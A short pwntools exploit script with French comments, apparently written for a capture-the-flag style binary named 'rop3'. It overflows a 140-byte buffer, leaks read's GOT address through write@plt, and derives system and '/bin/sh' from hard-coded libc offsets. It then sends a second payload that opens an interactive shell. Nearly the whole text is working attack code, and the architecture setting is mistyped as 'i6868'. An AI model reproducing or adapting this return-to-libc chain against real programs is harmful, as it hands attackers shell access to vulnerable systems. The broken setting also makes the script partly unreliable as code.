from pwn import *
context(arch="i6868",os="linux")
#PLT, pour Procedure Linkage Table, est une table sertvant à faire le lien avec les fonctions situées dans des bibliothèques dynamiques.

#write(1,address_read_GOT,4)
#leak = buffer + <adress_write> + <adress_vulnerable_function> + 1 + <adress_read>

leak = "A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08" + "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00"

#adresse write
#objdump -d rop3 | grep ">:"
#080483a0 <write@plt>:

#adresse read
#objdump -R rop3         VALUE 
#08049ff0 R_386_GLOB_DAT    __gmon_start__
#0804a000 R_386_JUMP_SLOT   read@GLIBC_2.0


#adresse vulnerable function
#   0x080484d4 <+14>:	call   0x8048474 <vulnerable_function>

exploit = process("./rop3",shell=True)
exploit.sendline(leak)
read_addr = unpack(exploit.recv(4))
print ("[+] Lecture a: "+hex(read_addr))


#calcul à partir de readadress de la fonction system et de la chiane binsh
system_address=read_addr-0xacf90
binsh_address = read_addr+0x9ded2

exploit.sendline(b"A"*140+pack(system_address)+b"JUNK"+pack(binsh_address))

exploit.interactive()
